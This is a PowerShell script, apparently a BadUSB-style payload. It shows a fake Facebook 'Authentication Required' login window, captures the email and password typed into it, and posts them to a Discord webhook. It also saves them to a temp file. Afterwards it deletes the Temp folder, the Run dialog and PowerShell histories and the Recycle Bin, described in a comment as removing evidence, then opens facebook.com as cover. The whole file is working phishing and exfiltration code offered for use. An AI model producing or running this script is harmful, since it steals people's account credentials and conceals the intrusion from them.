# Define the Upload-Discord function


function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    };

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $hookurl
    }
}

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
$creds | Out-File -FilePath "$env:TEMP\$FileName" -Encoding utf8
Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase



function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}
#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
#>

Pause-Script

Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Facebook Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "The user clicked: $Result"


# Define the URL to the image hosted on GitHub
$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.jpg"
# Define the URL to the icon hosted on GitHub
$iconUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.ico"
$iconFilePath = Join-Path $env:TEMP "custom_icon.ico"

# Download the icon from GitHub
Invoke-WebRequest -Uri $iconUrl -OutFile $iconFilePath
# Create XAML for the login window
$XAML = @"
<Window
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="Authentication Required" Height="350" Width="450" WindowStartupLocation="CenterScreen">
    <Grid>
        <Image Source="$imageUrl" Stretch="Fill" />
        <Grid Background="Transparent">
            <Grid.RowDefinitions>
                <RowDefinition Height="*"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="20"/> <!-- Empty row with 20 units of height -->
            </Grid.RowDefinitions>
            <TextBlock Grid.Row="0" Text="" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="20" Foreground="White"/>

            <StackPanel Grid.Row="1" Orientation="Vertical" HorizontalAlignment="Center">
                <Label Content="Email or Phone Number:" VerticalAlignment="Center" Foreground="White" HorizontalAlignment="Center"/>
                <TextBox Name="Username" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
            </StackPanel>

            <StackPanel Grid.Row="2" Orientation="Vertical" HorizontalAlignment="Center">
                <Label Content="Password:" VerticalAlignment="Center" Foreground="White" HorizontalAlignment="Center"/>
                <PasswordBox Name="Password" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
            </StackPanel>

            <Button Grid.Row="3" Content="Login" HorizontalAlignment="Center" VerticalAlignment="Top" Width="100" Name="LoginButton"/>
        </Grid>
    </Grid>
</Window>
"@


# Create a XML reader for the XAML
$reader = [System.Xml.XmlReader]::Create([System.IO.StringReader] $XAML)

# Load the XAML and create a Window object
$loginWindow = [Windows.Markup.XamlReader]::Load($reader)

# Define an event handler for the Login button
$loginButton = $loginWindow.FindName("LoginButton")
$loginButton.Add_Click({
    $enteredUsername = $loginWindow.FindName("Username").Text
    $enteredPassword = $loginWindow.FindName("Password").Password

    # Send the collected data to Discord
    $creds = "Email: $enteredUsername`nPassword: $enteredPassword"
    Upload-Discord -text $creds

    # Save the data to a file
    $fileName = "$env:USERNAME-$(Get-Date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
    $creds | Out-File -FilePath "$env:TEMP\$fileName" -Encoding utf8

    # Add your code for uploading the file to Dropbox here

    $loginWindow.Close()
    Write-Host "Data sent successfully!"
})

# Show the login window
$loginWindow.ShowDialog()

<#

.NOTES 
	This is to save the gathered credentials to a file in the temp directory
#>

echo $creds >> $env:TMP\$FileName

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

$URL = "https://www.facebook.com"

# Check if Google Chrome is installed
$ChromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"  # Update this path to match your Chrome installation path
$chromeInstalled = Test-Path $ChromePath

if ($chromeInstalled) {
    # If Chrome is installed, open Facebook in Chrome
    Start-Process $ChromePath $URL
} else {
    # If Chrome is not installed, use the default browser
    Start-Process $URL
}


exit
